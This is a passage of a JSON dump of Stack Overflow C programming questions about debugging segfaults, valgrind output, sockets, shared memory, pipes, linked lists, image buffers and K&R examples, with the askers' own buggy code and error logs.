== keyc[j])\n            {\n              wcount++;\n              putchar('w');\n              for (ind=0; ind&lt;patternlength; ind++)\n                if (output[ind]!='b')\n                  output[ind]='w';\n\n              keyc[j] = guessc[i] = '.';\n              break;\n            }\n            }\n        }\n        }\n      for (i = bcount  +  wcount; i &lt; patternlength; i++)\n        putchar('.');\n      for (ind=bcount+wcount; ind&lt;patternlength; ind++)\n        output[ind]='.';\n    }\n      count++;\n      printf(\" %s\\n\", guess);\n      strcpy(outputc, output);\n    }\n  if (strcmp(key, guess) != 0)\n    {\n      printf(\"You did not guess the pattern!\\n\");\n    }\n  else \n    {\n      printf(\"You guessed the pattern!\\n\");\n    }\n  return 0;\n}\n</code></pre>\n\n<p>output of code above:</p>\n\n<pre><code>Enter the pattern length: 3\nEnter the number of guesses: 3\nInput the key pattern with no spaces: abc\nInput a guess pattern with no spaces: acb\n1: bww acb\nInput a guess pattern with no spaces: abb\n1: bbb acb\n2: bb. abb\nInput a guess pattern with no spaces: abc\n2: bb. abb\n3: bbb abc\nYou guessed the pattern!\n</code></pre>\n\n<p><em><strong>required output:</em></strong></p>\n\n<pre><code>    Enter the pattern length: 3\n    Enter the number of guesses: 3\n    Input the key pattern with no spaces: abc\n    Input a guess pattern with no spaces: acb\n    1: bww acb\n    Input a guess pattern with no spaces: abb\n    1: bww acb\n    2: bb. abb\n    Input a guess pattern with no spaces: abc\n    1: bww acb\n    2: bb. abb\n    3: bbb abc\n    You guessed the pattern!\n</code></pre>\n\n<p>I tried to use one more string, which will store in it feedback of the guess, but when there are several guesses, i think i should use some kind of loop to print feedback of all previous guesses each time new guess is made. but it is difficult to me figure out how should i write this loop with the structure suggested by <a href=\"http://stackoverflow.com/users/15168/jonathan-leffler\">Jonathan Leffler</a>.</p>\n\n<p>I added my last correction to the code, so I almost reached the desired output. does anyone have an idea what is possible to do here?</p>\n"},{"tags":["c","valgrind"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":13215518,"title":"Showing free'd memory origin in Valgrind?","body":"<p>Valgrind is reporting that my program is performing an invalid read on a memory location that was freed by the garbage collector.</p>\n\n<p>It would be helpful for Valgrind to show the allocation location of the memory that was invalidly read along with the pair:</p>\n\n<blockquote>\n  <p>\"Invalid Read of size 2\"</p>\n</blockquote>\n\n<p>and</p>\n\n<blockquote>\n  <p>\"Address 0x523befe is 6 bytes inside a block of size 12 free'd\"</p>\n</blockquote>\n\n<p>But alas no memory allocation location is shown. Here's my Valgrind command line:</p>\n\n<blockquote>\n  <p>valgrind --tool=memcheck --leak-check=full  --track-origins=yes --undef-value-errors=yes --read-var-info=yes --num-callers=50</p>\n</blockquote>\n\n<p>I've tried sticking --track-origins=yes right after --tool=memcheck, and a couple other places, to no avail.</p>\n\n<p>Any idea how to get the memory creation location in this instance?</p>\n\n<p>EDIT:</p>\n\n<p>Here's the final Valgrind output:</p>\n\n<blockquote>\n  <p>==14849== LEAK SUMMARY: <br>\n  ==14849==    definitely lost: 0 bytes in 0 blocks <br>\n  ==14849==    indirectly lost: 0 bytes in 0 blocks <br>\n  ==14849==      possibly lost: 900 bytes in 24 blocks <br>\n  ==14849==    still reachable: 631,292 bytes in 45,043 blocks <br>\n  ==14849==         suppressed: 0 bytes in 0 blocks <br>\n  ==14849== Reachable blocks (those to which a pointer was found) are not shown. <br>\n  ==14849== To see them, rerun with: --leak-check=full --show-reachable=yes <br>\n  ==14849==  <br>\n  ==14849== For counts of detected and suppressed errors, rerun with: -v <br>\n  ==14849== ERROR SUMMARY: 14 errors from 14 contexts (suppressed: 0 from 0) <br></p>\n</blockquote>\n"},{"tags":["c","linked-list","visual-studio-2012"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":50,"score":2,"question_id":13215658,"title":"Making a Linked List","body":"<pre><code>typedef struct{\n    char name[25];\n    int yearOfBirth;\n    int district;\n    char gender;\n    int age;\n\n    CitizenType *next;\n\n}CitizenType;\n</code></pre>\n\n<p>When I try to make a Linked List in this format in Visual Studio, I get all sorts of errors relating to syntax. (102 in total) but when I comment out the CitizenType *next; I get no errors. I realize it has something to do with referencing the structure before it has been completely declared, but I have no idea how to fix this.</p>\n"},{"tags":["c"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":13215654,"title":"GIF LZW decompression hints?","body":"<p>I've read through numerous articles on GIF LZW decompression, but I'm still confused as to how it works or how to solve, in terms of coding, the more fiddly bits of coding.</p>\n\n<p>As I understand it, when I get to the  byte stream in the GIF for the LZW compressed data, the stream tells me:</p>\n\n<p>Minimum code size, AKA number of bits the first byte starts off with.</p>\n\n<p>Now, as I understand it, I have to either add one to this for the clear code, or add two for clear code and EOI code. But I'm confused as to which of these it is?</p>\n\n<p>So say I have 3 colour codes (01, 10, 11), with EOI code assumed (as 00) will the byte that follows the minimum code size (of 2) be 2 bits, or will it be 3 bits factoring in the clear code? Or is the clear code/EOI code both already factored into the minimum size?</p>\n\n<p>The second question is, what is the easiest way to read in dynamically sized bits from a file? Because reading an odd numbers of bits (3 bits, 12 bits etc) from an even numbered byte (8) sounds like it could be messy and buggy?</p>\n"},{"tags":["c","linux","send","sendfile"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":13215656,"title":"C, sendfile() and send() difference?","body":"<p>sendfile() copies data between two file descripters within kernel space. Somewhere I saw if you are writing a web server in C in linux you should use send() and recv() instead of using write() and read(). So is the send() use the kernel space as well?</p>\n\n<p>Whatever I use for sending - sendfile() or send() - on the client side I'll be using recv() right?</p>\n\n<p>On the flip side, <a href=\"http://linux.die.net/man/2/send\" rel=\"nofollow\">man page</a> says: \"The only difference between send() and write(2) is the presence of flags. With a zero flags argument, send() is equivalent to write(2).\" </p>\n"},{"tags":["c","fork","pipe"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":82,"score":0,"question_id":13213864,"title":"Multiprocessing and Pipes in C","body":"<p>I'm trying to learn how to work with <code>fork()</code> to create new processes and <code>pipes</code> to communicate with each process. Let's say I have a list that contains 20 words, and I create 3 processes. Now, I need to distribute the words between the processes using pipes, and the each process will sort the list of words it receives. The way I want to achieve this is like this:</p>\n\n<pre><code>Word1 =&gt; Process1\nWord2 =&gt; Process2\nWord3 =&gt; Process3\nWord4 =&gt; Process1\nWord5 =&gt; Process2\nWord6 =&gt; Process3\n.\n.\n.\n</code></pre>\n\n<p>So each process will have a list of words to sort, and eventually I'll use MergeSort to merge all the sorted lists returned by each process. I'm not sure how to use pipes to communicate with each process (e.g. feed each process with a word). Any help that would put me on the right track would be appreciated.</p>\n"},{"tags":["c++","c","varargs"],"answer_count":2,"favorite_count":2,"up_vote_count":7,"down_vote_count":0,"view_count":92,"score":7,"question_id":13215359,"title":"what happens if I pass a struct to a vararg function?","body":"<pre><code>void f(...){\n    //whatever\n}\n\nstruct somestruct{\n    size_t a, b, c;\n};\n\nint main() {\n    somestruct s;\n    f(s);   //what is actually passed?\n}\n</code></pre>\n\n<p>Is the entire <code>struct</code> copied and passed on the stack? If so are copy constructors called? Is the pointer passed? Is this safe?</p>\n"},{"tags":["c","struct","char"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":54,"score":2,"question_id":13215475,"title":"char* from char[] member of structure","body":"<p>I have a structure:</p>\n\n<pre><code>typedef struct {\n    LogLevel level;\n    char message[255];\n} LogMessage;\n</code></pre>\n\n<p>I then have a function which receives a pointer to a LogMessage structure, and needs to call a function that takes in a char*:</p>\n\n<pre><code>xStatus = xQueueReceive(xQueueHandleGSMSend, &amp;lReceivedData, portMAX_DELAY);\n\nif(xStatus == pdPASS)\n{\n    logSimpleMessage(&amp;lReceivedData-&gt;message, 1);\n}\n</code></pre>\n\n<p>Here is the prototype for the logSimpleMessage function:</p>\n\n<pre><code>void logSimpleMessage(const char * message, int level);\n</code></pre>\n\n<p>When I attempt to call it with the above code, I am not getting the correct address (or contents) of the message.  How do I get a char* that points to the message of lReceivedData?</p>\n\n<p>EDIT: I have attempted to use lReceivedData->message, as suggested, but I am still not getting the correct address or values.  Here is a screen cap of the IDE... Am I doing something terribly wrong in the debugger, because it seems as though it should work.</p>\n\n<p><img src=\"http://i.stack.imgur.com/TGlsq.png\" alt=\"enter image description here\"></p>\n"},{"tags":["c"],"answer_count":4,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":13215486,"title":"previous declaration of 'function' was here in C","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/8763052/learning-c-by-kr-error-when-trying-to-compile-programs-from-book-with-arrays-a\">Learning C by K&amp;R, error when trying to compile programs from book with arrays and function calls</a>  </p>\n</blockquote>\n\n\n\n<p>While learning The C Programming Language by Brian W. Kernighan and Dennis M. Ritchie, I tried the example in section 1.9 Character Arrays. Here are the codes:</p>\n\n<pre><code>/* read a set of text lines and print the longest */\n\n#include &lt;stdio.h&gt;\n#define MAXLINE 1000 /* maximum input line length */\n\n/* declare functions: getline() and copy() */\nint getline(char line[], int maxline); \nvoid copy(char to[], char from[]);\n\n/* getline: read a line into array \"s\", return length */ \nint getline(char s[], int lim)\n{\n    int c, i;\n    for (i=0; i &lt; lim-1 &amp;&amp; (c=getchar())!=EOF &amp;&amp; c!='\\n'; ++i)\n        s[i] = c;\n    if (c == \"\\n\"){\n        s[i] = c;\n        ++i;\n    }\n    s[i] = '\\0';  /* the null character whose value is 0 */\n    return i;\n}\n\n/* copy: copy 'from' into 'to'; assume to is big enough */ \n/* the return type of copy is \"void\" -- no value is returned */\nvoid copy(char to[], char from[])\n{\n    int i;\n    i = 0;\n    while ((to[i] = from[i]) != '\\0')  /* terminated with a \\0 */\n        ++i; \n}\n\n/* print the longest input line */\nint main()\n{\n    int len;  /* current line length */ \n    int max;  /* maximum length seen so far */\n    char line[MAXLINE];  /* current input line */\n    char longest[MAXLINE];  /* longest line saved here */\n\n    max = 0;\n    while ((len = getline(line, MAXLINE)) &gt; 0)\n    if (len &gt; max) { \n        max = len;\n        copy(longest, line); \n    }\n    if (max&gt;0) /* there was a line */ \n        printf(\"%s\", longest);\n    return 0; \n}\n</code></pre>\n\n<p>There are two main errors:</p>\n\n<ol>\n<li>error: conflicting types for ‘getline’</li>\n<li>error: previous declaration of ‘getline’ was here</li>\n</ol>\n\n<p>The complete error list is here:</p>\n\n<pre><code>/Users/C/Codes/Ritchie/array_char.c:8: error: conflicting types for ‘getline’\n/usr/include/stdio.h:449: error: previous declaration of ‘getline’ was here\n/Users/C/Codes/Ritchie/array_char.c:13: error: conflicting types for ‘getline’\n/usr/include/stdio.h:449: error: previous declaration of ‘getline’ was here\n/Users/C/Codes/Ritchie/array_char.c: In function ‘getline’:\n/Users//C/Codes/Ritchie/array_char.c:17: warning: comparison between pointer and integer\n/Users/C/Codes/Ritchie/array_char.c:17: warning: comparison with string literal results in unspecified behavior\n</code></pre>\n\n<p>I am not sure what went wrong, since it is exactly the same code from the book. Maybe the declaration of functions at the beginning:</p>\n\n<pre><code>int getline(char line[], int maxline); \nvoid copy(char to[], char from[]);\n</code></pre>\n\n<p>is problematic? Thank you!</p>\n"},{"tags":["c","printf","format-specifiers"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":43,"score":2,"question_id":13215259,"title":"Using Format Specifiers in printf() Without a Corresponding Value","body":"<p>Here's a quick question.</p>\n\n<p>When you use format specifiers in the string you want to print, but don't list any values which you want to replace the placeholders with after the string, you get seemingly random numbers such as 2627389, 6278253 etc. as the output. Here's an example:</p>\n\n<pre><code>printf(\"%d %d %d\");\n</code></pre>\n\n<p>The output would look something like:</p>\n\n<pre><code>2621244 4352722 1426724\n</code></pre>\n\n<p>I was wondering why this happens, and what those numbers mean. If you have an idea, it would really help.\nThanks.</p>\n"},{"tags":["c","sockets","posix"],"answer_count":6,"favorite_count":1,"up_vote_count":11,"down_vote_count":0,"view_count":7690,"score":11,"question_id":855544,"title":"Is there a way to flush a POSIX socket?","body":"<p>Is there a standard call for flushing the transmit side of a POSIX socket all the way through to the remote end or does this need to be implemented as part of the user level protocol? I looked around the usual headers but couldn't find anything.</p>\n"},{"tags":["c","sockets"],"answer_count":4,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":7584,"score":4,"question_id":2171412,"title":"Flushing the socket streams in C socket programming","body":"<p>I wanted to know how to flush the socket streams while doing socket programming in C. I tried all the options- setting <code>TCP_NODELAY</code> using the following code- </p>\n\n<pre><code>setsockopt(sockfd, IPPROTO_TCP, TCP_NODELAY, (char *) &amp;flag, sizeof(int));      \n</code></pre>\n\n<p>Note: all the <code>flag</code> and <code>sockfd</code> are declared correctly.</p>\n\n<p>I used this function both before <code>send(</code>) and after <code>send()</code> but it did not make any difference. </p>\n\n<p>Also someone had suggested to use <code>shutdown()</code> after each <code>send()</code> but that works only for one instance. When I use it to send some text again, it doesn't work- actually the connection gets closed after I use <code>shutdown()</code>. </p>\n\n<pre><code>shutdown(sockfd, SHUT_WR);\n</code></pre>\n\n<p>Can someone help in this regard? </p>\n\n<p>I wanted to added that- the server is a Java socket and the client is a C socket. The C socket implements the JVMTI interface and sends the information to the Java socket. </p>\n"},{"tags":["c","linux","assembly","x86","segmentation-fault"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":85,"score":1,"question_id":13214779,"title":"Segfault shows up only in GDB","body":"<p>Why does the following program not crash when it is executed, but crash with a segfault in GDB? Compiled with GCC 4.5.2 on a 32-bit x86 (Athlon 64, if it should matter).</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint modify(void)\n{\n        __asm__(\"mov $0x41414141, %edx\"); // Stray value.\n        __asm__(\"mov $0xbffff2d4, %eax\"); // Addr. of ret pointer for function().\n        __asm__(\"mov %edx, (%eax)\");\n}\n\nint function(void)\n{\n        modify();\n\n        return 0;\n}\n\nint main(int argc, char **argv)\n{\n        function();\n\n        return 0;\n}\n</code></pre>\n\n<p>The mov $0xbffff2d4, %eax was determined using GDB to find the address where the return pointer was stored for the \"function\" function. This will probably be different on a different system. ASLR was disabled for this.</p>\n\n<p>When I execute the program, nothing happens. There is no report of a crash in dmesg either. However when I execute the same program in GDB:</p>\n\n<pre><code>Program received signal SIGSEGV, Segmentation fault.\n0x41414141 in ?? ()\n=&gt; 0x41414141:  Cannot access memory at address 0x41414141\n</code></pre>\n\n<p>This is what I expect should happen when I execute the program normally as well. I do indeed get segfaults as usual when other programs crash, and I can easily write a small program that crashes with a nice segfault. But why does this particular program not crash with a segfault?</p>\n"},{"tags":["objective-c","c","image","indexing","nsimage"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":35,"score":2,"question_id":13212955,"title":"Perplexing indexing bug creating an NSImage from an array of bytes","body":"<p>I'm creating an <code>NSImage</code> from scratch in my code.  To start I allocate an array of bytes:</p>\n\n<pre><code>pixels = malloc( (int)( size.width * size.height) * 4 * 8 * sizeof(unsigned char));\n</code></pre>\n\n<p>I then attempt to create a test image, that should contain a gradient going from pure black on the left to pure red on the right:</p>\n\n<pre><code>-(void)generateTestImage{\n    int idx =0;\n    for( int i=0; i&lt;(int)(size.height); i++){// Rows\n        for (int j=0; j&lt;(int) size.width; j++){// Columns            \n            pixels[ idx + 0 ] = 255 * ((float) j / size.width); // r\n            pixels[ idx + 1 ] = 0; //  g\n            pixels[ idx + 2 ] = 0; //  b\n            pixels[ idx + 3 ] = 255;// a\n\n            idx += 4;\n        }\n    }\n}\n</code></pre>\n\n<p>Finally  I convert the array of bytes into a <code>NSImage</code> using:</p>\n\n<pre><code>-(void) convertPixelsToImage{\n\n    if (renderImage == NULL)\n        renderImage = [[NSImage alloc] initWithSize:size];\n    else{\n\n        NSArray *prevReps = [renderImage representations];\n        for (id r in prevReps)\n            [renderImage removeRepresentation:r];\n    }\n\n    NSLog(@\"Creating bitmapImageReprsentation with size:%@\", NSStringFromSize(size));\n    NSBitmapImageRep *imgRep =\n    [[NSBitmapImageRep alloc] initWithBitmapDataPlanes:&amp;pixels\n                                            pixelsWide:size.width\n                                            pixelsHigh:size.height\n                                         bitsPerSample:8\n                                       samplesPerPixel:sampPerPix\n                                              hasAlpha:true\n                                              isPlanar:false\n                                        colorSpaceName:NSDeviceRGBColorSpace\n                                          bitmapFormat:0\n                                           bytesPerRow:0\n                                          bitsPerPixel:0];\n\n    [renderImage addRepresentation:imgRep];\n}\n</code></pre>\n\n<p>However, the resulting image isn't what I expect. </p>\n\n<p><img src=\"http://i.stack.imgur.com/vIARH.png\" alt=\"enter image description here\">  </p>\n\n<p>Here is a zoomed in view of the indexing offset\n<img src=\"http://i.stack.imgur.com/R7VPQ.png\" alt=\"enter image description here\"></p>\n\n<p>It appears as though my I'm indexing is off, as the gradient pattern shifts by 9 pixels to the left on each row.</p>\n\n<p>Additionally I'm confused by the white stripe at the bottom of the image...</p>\n\n<p>I've spent the last few hours trying various indexing schemes non of which fix the problem. I've verified that I'm using the same <code>size</code> throughout my code. Additionally I've verified that the resulting image has the right dimensions, but its the content that is off.</p>\n\n<p>Is there an obvious problem with this code? Any ideas on how to fix this?</p>\n"},{"tags":["c","arrays","memory-management","initialization","valgrind"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":13215046,"title":"Perhaps a memory issue when I reinitialize an array?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/13214567/reinitializing-an-array-is-creating-a-segfault\">Reinitializing an Array is creating a segfault?</a>  </p>\n</blockquote>\n\n\n\n<p>I am running bellman ford and BFS on an input of edges with a given weight in the format (vertexa, vertexb, weight). After each time I read in the newest edge, I run BFS (part of a research project).</p>\n\n<p>It appears to work perfectly with small sets, vertex's of 8 to 10, but when I jump to the next sample data which involves sets of vertex's 100 or greater it fails and segfaults when I reinitialize...</p>\n\n<p>At first I initialize it like this: </p>\n\n<pre><code>for(i=0;i&lt;numberVertices;i++)\n        {\n                vertexArray[i].v = i+1;\n                vertexArray[i].adj = NULL;\n                vertexArray[i].marked = 0;\n                if(i==0)\n                {\n                        vertexArray[i].weight = 0;\n                }\n                else{\n                        vertexArray[i].weight = 10000;\n                }\n        }\n</code></pre>\n\n<p>After calling BFS I must reinitialize marked to 0 so that BFS will work again so I reinitiailize the array:</p>\n\n<p>numberUseful += BFS(vertexArray, q, u);</p>\n\n<pre><code>            for(i=0;i&lt;numberVertices;i++)\n            {\n                    vertexArray[i].marked = 0;\n            }\n</code></pre>\n\n<p>and the line <code>vertexArray[i].marked = 0;</code> gives a segfault.</p>\n\n<p>At anothers suggestion I ran valgrind with this program as well yielding:</p>\n\n<pre><code>==6634== Memcheck, a memory error detector\n==6634== Copyright (C) 2002-2010, and GNU GPL'd, by Julian Seward et al.\n==6634== Using Valgrind-3.6.0 and LibVEX; rerun with -h for copyright info\n==6634== Command: ./a.out 100S.txt\n==6634==\n==6634== Conditional jump or move depends on uninitialised value(s)\n==6634==    at 0x400C13: checkonqueue (bfs.c:160)\n==6634==    by 0x400B7F: BFS (bfs.c:142)\n==6634==    by 0x40094A: main (bfs.c:103)\n==6634==\n==6634== Invalid write of size 4\n==6634==    at 0x40096E: main (bfs.c:107)\n==6634==  Address 0x4d00000041 is not stack'd, malloc'd or (recently) free'd\n==6634==\n==6634==\n==6634== Process terminating with default action of signal 11 (SIGSEGV)\n==6634==  Access not within mapped region at address 0x4D00000041\n==6634==    at 0x40096E: main (bfs.c:107)\n==6634==  If you believe this happened as a result of a stack\n==6634==  overflow in your program's main thread (unlikely but\n==6634==  possible), you can try to increase the size of the\n==6634==  main thread stack using the --main-stacksize= flag.\n==6634==  The main thread stack size used in this run was 10485760.\n==6634==\n==6634== HEAP SUMMARY:\n==6634==     in use at exit: 3,448 bytes in 181 blocks\n==6634==   total heap usage: 181 allocs, 0 frees, 3,448 bytes allocated\n==6634==\n==6634== LEAK SUMMARY:\n==6634==    definitely lost: 0 bytes in 0 blocks\n==6634==    indirectly lost: 0 bytes in 0 blocks\n==6634==      possibly lost: 0 bytes in 0 blocks\n==6634==    still reachable: 3,448 bytes in 181 blocks\n==6634==         suppressed: 0 bytes in 0 blocks\n==6634== Reachable blocks (those to which a pointer was found) are not shown.\n==6634== To see them, rerun with: --leak-check=full --show-reachable=yes\n==6634==\n==6634== For counts of detected and suppressed errors, rerun with: -v\n==6634== Use --track-origins=yes to see where uninitialised values come from\n==6634== ERROR SUMMARY: 16120 errors from 2 contexts (suppressed: 6 from 6)\n</code></pre>\n\n<p>Which I am told gave me errors at the same line as my segfault (107) and at line 160 which is part of the checkonqueue function:</p>\n\n<pre><code>int checkonqueue(int * q, int value)\n{\n        int i = 0;\n        for(i=0;i &lt; max;i++)\n        {\n                if(q[i] == value)\n                {\n                        return 1;\n                }\n        }\n        return 0;\n}\n</code></pre>\n\n<p>Where <code>if(q[i] == value)</code> gave a memory issue so I'm told.</p>\n\n<p>The reason I believe it may be a memory issue is due to the fact that it works with smaller sets (or so it seems!)</p>\n\n<p>If you have any idea how to really use valgrind or can spot an error I'd be extremely grateful!</p>\n\n<p>BFS:</p>\n\n<pre><code>while(front != -1)\n{\n    u = dequeue(q);\n    if(vertexArray[u-1].adj != NULL)\n    {\n        adjacent = vertexArray[u-1].adj;\n        vertexArray[u-1].marked = 1;\n\n\n        while(adjacent != NULL)\n        {\n            v = adjacent-&gt;v;\n            if(distance[vertexArray[v-1].v-1] &gt; distance[vertexArray[u-1].v-1] + adjacent-&gt;edgeWeight)\n            {\n                distance[vertexArray[v-1].v-1] = distance[vertexArray[u-1].v-1] +adjacent-&gt;edgeWeight;\n                success = 1;\n\n            }\n\n            int check = 0;\n            check = checkonqueue(q, v);\n            if(check == 0 &amp;&amp; vertexArray[v-1].marked == 0)\n            {\n                enqueue(q, v);\n            }\n            adjacent = adjacent-&gt;next;\n        }\n    }\n}\nreturn success;\n</code></pre>\n"},{"tags":["c","posix","fork","shared-memory"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13213283,"title":"How to give starting address to attach to that in shmat() shared memory segment?","body":"<p>All headers are included as per requirement. This piece of code below is working but the problem is with <code>shmat(seg_id,NULL,0)</code>.<code>NULL</code> in the 2nd argument means the Operating system will take care of the location on Users' behalf . But we can give our own memory location but how ? I don't know , Please help . <code>(OS - Ubuntu 11.04 ,Compiler gcc 4.5.2)</code>\nI tried <code>man shmat</code> but didn't understand it completely</p>\n\n<pre><code>typedef struct {\n         int id;\n} emp;\n\nint main() {\n         emp *e;\n         int seg_id;\n         const int size=sizeof(emp);\n         seg_id=shmget( IPC_PRIVATE, size, S_IRUSR | S_IWUSR); \n         pid_t pid=fork();\n         if(pid&lt;0) {\n                 printf(\"Error\");\n                 return -1;\n         }\n         else if(pid == 0) {\n                e=(emp *)shmat(seg_id,NULL,0);     \n                 e-&gt;id=123;\n                 shmdt(e);                       \n         }\n         else {\n                 wait(NULL);\n                 e=(emp *)shmat(seg_id,NULL,0);  \n                 printf(\"\\nEmp Id : %d\\n\\n\",e-&gt;id);\n                 shmdt(e);                          \n                 shmctl(seg_id, IPC_RMID, NULL);  \n         }\n         return 0;\n}\n</code></pre>\n\n<p>I tried this also to get our own address for <code>shmget()</code> for 4K page alignment</p>\n\n<pre><code>emp *e;\nvoid **p;\nposix_memalign(&amp;p,4096,4096); // alignment as of pagesize 4K \ne=p; // get the first address of the aligned memory \nfree(p); // free the allocated memory\n</code></pre>\n\n<p>then used this as <code>shmat(seg_id,e,0);</code> // thinking that e will be the address that I want.\nBut it's giving segmentation fault</p>\n\n<p>Or, Is there a problem with the 3rd argument also ? \nAny help or suggestion will be greatly appreciated</p>\n"},{"tags":["c","checksum"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":28,"score":2,"question_id":13215047,"title":"How to add Checksum in file","body":"<p>My task: Write a program, that will add checksum to the file, at every few number of bits.\nChecksum are found in a file immediately after the bit affected. Use checksum parity algrithm. Add check and delete function. </p>\n\n<p>I read something about checksum, but i don't know how this works.</p>\n\n<p>I think that I should read file char by char, and if I read X bits then using checksum parity algorithm. But i don't know, how checking and delete functions should work.</p>\n\n<p>Thanks for help, and sorry for my English.</p>\n"},{"tags":["c","memory","heap","calloc"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":13214484,"title":"Reading and writing dynamically allocated memory","body":"<p>I have some code with following parts:</p>\n\n<pre><code>typedef unsigned long long int ulli_t;\ntypedef unsigned int obj_t;\n// --- SOME UNIMPORTANT PART OF CODE\nobjects = (obj_t*)malloc(hw*sizeof(obj_t));\nobjNums = (ulli_t*)calloc(hw, sizeof(ulli_t));\nprintf(\"%#x, %#x\\n\", objects, objNums);\n// --- SOME UNIMPORTANT CODE\n/// NEXT PART IS for-CYCLED\nobjNums[k] ++;\nif (k&gt;=Nobj) {\n   objects[k] = obj;\n   Nobj++;\n   printf(\" %lu - %#x - %#x\\n\", k, objects+k, objNums+k);\n};\n</code></pre>\n\n<p>And I've got an output of this part of code:</p>\n\n<pre><code>0xaafdf9d8, 0xaad693b0\n 0 - 0 - 0xaafdf9d8\n 1 - 0 - 0xaafdf9dc\n 2 - 0 - 0xaafdf9e0\n 3 - 0 - 0xaafdf9e4\n 4 - 0 - 0xaafdf9e8\n 5 - 0 - 0xaafdf9ec\n 6 - 0 - 0xaafdf9f0\n 7 - 0 - 0xaafdf9f4\n 8 - 0 - 0xaafdf9f8\n 9 - 0 - 0xaafdf9fc\n 10 - 0 - 0xaafdfa00\n 11 - 0 - 0xaafdfa04\n</code></pre>\n\n<p>So, here is the question - If 'objects' variable is non-zero then why does 'objects+k' is zero?\nWhen I make :</p>\n\n<pre><code>printf(\" %lu - %#x - %#x\\n\", k, objects[k], objNums[k]);\n</code></pre>\n\n<p>I get lines like:</p>\n\n<pre><code>value of k - 0 - hex value of objNums[k]\n</code></pre>\n\n<p>Why is that?\nI already got my brain broken thinking about that thing.</p>\n"},{"tags":["c","linux-kernel"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13214847,"title":"TraceFs: ioctl: inappropriate ioctl for device","body":"<p>Hi I am getting this error: ioctl: inappropriate ioctl for device\non the ioctl() call shown below. </p>\n\n<pre><code>fd = open(mount, O_RDONLY);\n\ndestid = ioctl(fd, TRACEFS_IOCTL_ADD_OUTPUT_DRIVERS, data);\n\n\n\n#define IOCBASE 10\n\n#define TRACEFS_IOCTL_ADD_OUTPUT_DRIVERS    _IOW(0x15, IOCBASE + 0, int)\n</code></pre>\n\n<p>I am not sure how to debug this issue or go about resolving the error. </p>\n\n<p>Any help would be greatly appreciated. \nThanks.</p>\n"},{"tags":["c","memory-management","initialization","segmentation-fault"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":77,"score":0,"question_id":13214567,"title":"Reinitializing an Array is creating a segfault?","body":"<p>I am running breadth first search and bellman ford algorithms on large sets of graph data in the format (u, v, weight) from an input file.</p>\n\n<p>I initialize in the breadth first search, that all vertex's should be marked 0 for unvisited.</p>\n\n<p>Later in the program, since I am calling BFS after every time I add an edge, rather than at the end of the program all together (it's part of a research project on bellman ford and BFS even though it doesn't quite make sense) I reinitialize the vertex array to unvisited.</p>\n\n<p>However, I am getting a segmentation fault when I run larger sets it seems when I reinitialize the vertex array. I make the assumption about larger sets because I have a few smaller sets of test data going from 8 vertices, to 10, then at 100 and larger it fails.</p>\n\n<p>Here is how I initialize at the very beginning of the program:</p>\n\n<pre><code>for(i=0;i&lt;numberVertices;i++)\n{\n    vertexArray[i].v = i+1;\n    vertexArray[i].adj = NULL;\n    vertexArray[i].marked = 0;\n    if(i==0)\n    {\n        vertexArray[i].weight = 0;\n    }\n    else{\n        vertexArray[i].weight = 10000;\n    }\n}\n</code></pre>\n\n<p>And here is how I reinitialize at the end of a while loop set to break when it reaches the end of the file directly after BFS finishes:</p>\n\n<pre><code>BFS(q, u)\nfor(i=0;i&lt;numberVertices;i++)\n{\n    vertexArray[i].marked = 0;\n}\n</code></pre>\n\n<p>Like I said it seems to work for smaller data sets, but I do not understand why when I reinitialize it seems to seg fault.</p>\n\n<p>Please let me know your thoughts and suggestions!</p>\n\n<p>Valgrind Output On An Example Case:</p>\n\n<pre><code>==6634== Memcheck, a memory error detector\n==6634== Copyright (C) 2002-2010, and GNU GPL'd, by Julian Seward et al.\n==6634== Using Valgrind-3.6.0 and LibVEX; rerun with -h for copyright info\n==6634== Command: ./a.out 100S.txt\n==6634==\n==6634== Conditional jump or move depends on uninitialised value(s)\n==6634==    at 0x400C13: checkonqueue (bfs.c:160)\n==6634==    by 0x400B7F: BFS (bfs.c:142)\n==6634==    by 0x40094A: main (bfs.c:103)\n==6634==\n==6634== Invalid write of size 4\n==6634==    at 0x40096E: main (bfs.c:107)\n==6634==  Address 0x4d00000041 is not stack'd, malloc'd or (recently) free'd\n==6634==\n==6634==\n==6634== Process terminating with default action of signal 11 (SIGSEGV)\n==6634==  Access not within mapped region at address 0x4D00000041\n==6634==    at 0x40096E: main (bfs.c:107)\n==6634==  If you believe this happened as a result of a stack\n==6634==  overflow in your program's main thread (unlikely but\n==6634==  possible), you can try to increase the size of the\n==6634==  main thread stack using the --main-stacksize= flag.\n==6634==  The main thread stack size used in this run was 10485760.\n==6634==\n==6634== HEAP SUMMARY:\n==6634==     in use at exit: 3,448 bytes in 181 blocks\n==6634==   total heap usage: 181 allocs, 0 